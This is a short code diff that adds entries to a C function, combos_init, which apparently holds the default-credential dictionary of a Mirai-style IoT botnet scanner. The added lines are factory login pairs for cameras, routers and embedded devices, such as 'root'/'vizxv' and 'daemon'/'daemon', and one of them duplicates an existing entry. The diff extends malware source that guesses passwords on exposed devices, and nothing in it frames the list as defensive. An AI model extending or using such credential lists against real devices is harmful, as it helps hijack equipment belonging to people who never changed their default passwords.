@@ -52,10 +52,14 @@ void combos_init(void)
     combo_add("admin", "123456");
     combo_add("hikvision", "hikvision");
     combo_add("root", "toor");
-    combo_add("", "");
+    combo_add("root", "user");
     combo_add("operator", "operator");
     combo_add("ftp", "ftp");
     combo_add("root", "888888");
+    combo_add("default", "");
+    combo_add("daemon", "daemon");
+    combo_add("root", "vizxv");
+    combo_add("root", "pass");
     combo_add("default", "");
     combo_add("1234", "1234");
 }
